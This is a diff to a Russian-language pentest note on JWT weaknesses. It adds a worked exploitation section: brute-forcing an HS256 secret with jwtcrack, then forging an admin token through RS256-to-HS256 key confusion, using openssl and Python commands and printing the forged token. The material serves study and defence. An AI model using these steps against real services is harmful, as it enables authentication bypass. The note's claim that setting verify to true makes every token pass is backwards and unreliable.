@@ -48,8 +48,8 @@ ECDSA + P-256 + SHA256
 
 Валидация токена в общем виде выполняется следующем образом.
 
-![валидация](https://www.javainuse.com/62-3-min.JPG)
-https://dzone.com/articles/spring-boot-security-json-web-tokenjwt-hello-world
+![валидация](https://www.javainuse.com/62-3-min.JPG)    
+[валидация](https://dzone.com/articles/spring-boot-security-json-web-tokenjwt-hello-world)
 
 Существует много способов использования токенов. И вот основные из них:
 
@@ -77,7 +77,7 @@ HMACSHA256(
 )
 ```
 
-Само тело токена кодируется base64UrlEncode, что в
+Само тело токена кодируется base64UrlEncode, который абсолютно небезопасен. Шифруется\расшфровывается первой же ссылкой в гугле.
 
 2.Измените алгоритм на «None»
 
@@ -103,8 +103,18 @@ class NoneAlgorithm(Algorithm):
         return False
 ```
 
+3.Взлом ключа HS256
+HS256 алгоритм использует секретный ключ для подписи и подтверждения токенов. Если узнать этот ключ, можно будет самостоятельно подписывать токены. Если ключ недостаточно силен, его можно сломать с помощью атаки методом перебора или словаря. Попробовав множество ключей на JWT и проверив, действительна ли подпись, мы можем обнаружить секретный ключ. Это можно сделать в автономном режиме, без каких-либо запросов к серверу, как только мы получим токен.
 
-3.Эксплуатация HS256
+Инструменты для брута:  
+https://github.com/jmaxxz/jwtbrute  
+или  
+John the Ripper  
+или  
+https://github.com/brendan-rius/c-jwt-cracker
+
+
+4.Эксплуатация HS256
 
 Алгоритм RS 256 использует секретный ключ для подписи и проверки каждого сообщения.Алгоритм RS 256 использует закрытый ключ для подписи сообщений. Поскольку открытый ключ вообще не является секретным, мы можем правильно подписывать такие сообщения. Вот как можно их использовать:
 
@@ -114,16 +124,9 @@ class NoneAlgorithm(Algorithm):
   Подпишу токен открытым ключом RSA
   https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/
 
-4.Локальное хранилище
+5.Локальное хранилище
 можно вытащить из работающего браузера всю инфу включая его локальное хранилище, или же вытащить это все из рама. Оттуда уже достать токен и просто напросто использовать его для авторизованного доступа в сеть.
 
-5.Crack the key
-HS256 algorithm uses a secret key to sign and verify messages. If we know this key, we can create our own signed messages. If the key is not sufficiently strong it may be possible to break it using a brute-force or dictionary attack. By trying a lot of keys on a JWT and checking whether the signature is valid we can discover the secret key. This can be done offline, without any requests to the server, once we have obtained a JWT.
-
-Инструменты для брута
-https://github.com/jmaxxz/jwtbrute
-или
-John the Ripper
 
 6.Timing Attack
 Timing Attack - это атака по побочному каналу, при которой можно скомпрометировать криптосистему, измерив, сколько времени потребуется системе, чтобы ответить на разные входы. Для проверки подписи с использованием криптографии с симметричным ключом сервер обычно вычисляет побайтово действительную подпись и сравнивает ее с предоставленной. Однако, если байт не совпадает, мы прекращаем сравнивать другие байты. Измеряя время ответа сервера можно определять верное количество байт.
@@ -159,12 +162,34 @@ https://pivotal.io/security/cve-2018-15801
 
 ## Детектирование
 
-[Burp suit](https://github.com/mvetsch/JWT4B)
+[Burp suit](https://github.com/mvetsch/JWT4B) есть несколько плагинов.
 
 Код ревью
 
 ## Эксплуатация
 
+Структура токена:
+
+HEADER:ALGORITHM & TOKEN TYPE
+```
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+PAYLOAD:DATA
+
+{
+  "username": "user",
+  "is_admin": true
+}
+{
+  "username": "user",
+  "is_admin": true
+}
+```  
+
+
+Токен никогда не будет проходить процедуры проверки.
 
 ```
 @app.route("/index_1", methods=['GET'])
@@ -186,8 +211,41 @@ def index_1():
 	return render_template('index_login.html', isLoggedIn=isLoggedIn, result=result)
 ```
 
-result = jwt.decode(session, key=jwt_secret, verify=False)
-замена False на true приводит к тому что токен будет всегда приниматься.
+result = jwt.decode(session, key=jwt_secret, verify=False) замена False на true приводит к тому что токен будет всегда приниматься.  
+
+Взлом HS256 тупо брутом.  
+```
+$ ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc qwertyuiopasdfghjklzxcvbnm
+Secret is "secret"
+```
+
+Подмена ассиметричного шифрования RS на симметричное HS
+```
+	b64_public = base64.standard_b64encode(public).decode()
+  ```
+Так как сервер выдает публичный ключ, то мы можем его использовать для того чтобы обмануть механизм шифрования. Так как в методах не захардкожено, необходимое шифрование, мы может заставить сервер шифровать и расшифровывать сигнатуру токена с использованием симметричного шифрования по публичному ключу.
+```
+-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDIfXNTOUNW9t6gH0OURcsbYu9f
+AQIkL9fUxsIckicd67DIOyotPquMo5Ak0MJWjlirWkZnBZIyDoLkzr9a28KMhxzM
+5aGvuuj5DyPBeQeJJz1Duimtw/OcbY9sUtNhQNrq2Ww2EMrjuTQXyG2Yaf6uNmlW
+LB+v4AZ99OepLO+DpQIDAQAB
+-----END PUBLIC KEY-----
+```
+Переведу его значение в hex и изменив данные в поле header (меняется шифрования с асимметрии на симметрию поле alg) и payload (добавлю в токен права админа потому что почему бы и нет) и подпишу этим публичным ключом вновь собраннуй json.
+```
+ "тело токена" | openssl dgst -sha256 -mac HMAC -macopt hexkey:ключвхексе
+```
+После чего верну получившиеся значение подписи в формат сигнатуры base64UrlEncode
+```
+ base64.urlsafe_b64encode(binascii.a2b_hex('db3a1b760eec81e029704691f6780c4d1653d5d91688c24e59891e97342ee59f')).replace('=','')
+```
+В итоге получаем токен админа, прошедший проверку ассиметричной подписи.
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6dHJ1ZX0.IFQI6Zh9Gja_d48CKHo80SZonepddPiemcz_l8WyfFI
+```
+
+https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/
 
 ### Инструменты
 [PyJWT library](https://github.com/jpadilla/pyjwt)  
@@ -229,6 +287,7 @@ Macaroons - токены от google
 https://datatracker.ietf.org/doc/draft-ietf-oauth-jwt-bcp/?include_text=1
 
 ## Дополнительно
+[Elleptic curves vuln](https://auth0.com/blog/critical-vulnerability-in-json-web-encryption/)  
 https://connect2id.com/products/nimbus-jose-jwt/examples
 
 [Owasp cheat sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/JSON_Web_Token_Cheat_Sheet_for_Java.md)
